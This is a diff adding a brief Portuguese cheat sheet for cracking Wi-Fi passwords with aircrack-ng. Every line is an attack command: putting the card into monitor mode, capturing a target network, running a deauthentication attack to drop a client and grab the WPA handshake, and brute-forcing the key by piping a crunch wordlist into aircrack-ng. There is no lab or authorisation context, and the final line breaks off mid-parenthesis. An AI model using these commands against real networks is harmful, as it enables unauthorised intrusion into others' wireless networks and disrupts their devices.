@@ -1,0 +1,7 @@
+Iwconfig-mostra interface de rede
+airmon-ng start wlan0
+iwconfi-para ver qual interface foi gerada(mon0 ou wlan0mon)
+airodump-ng (coloca qual interface foi gerada(mon0 ou wlan0mon))-monitora as redes proximas
+airodump-ng --bssid (coloca bssid) -w (nome do arquivo para ser gerado) -c (colocar canal) (interface de rede(mon0 ou wlan0mon))-monitora uma rede especifica
+aireplay-ng --deauth 0 -c (station do q vc quer desautenticar) -a (bssid da rede) (interface de rede)-derruba um aparelho.É preciso parar o processo para receber o aperto de mãos(handshake)
+crunch (mínimo de dígitos da key) (máximo) (dígitos possíveis) | [|=pipe] aircrack-ng -w -  -b (bssid) (mais o arquivo q foi gerado,serão gerados vários, escolha o .cap
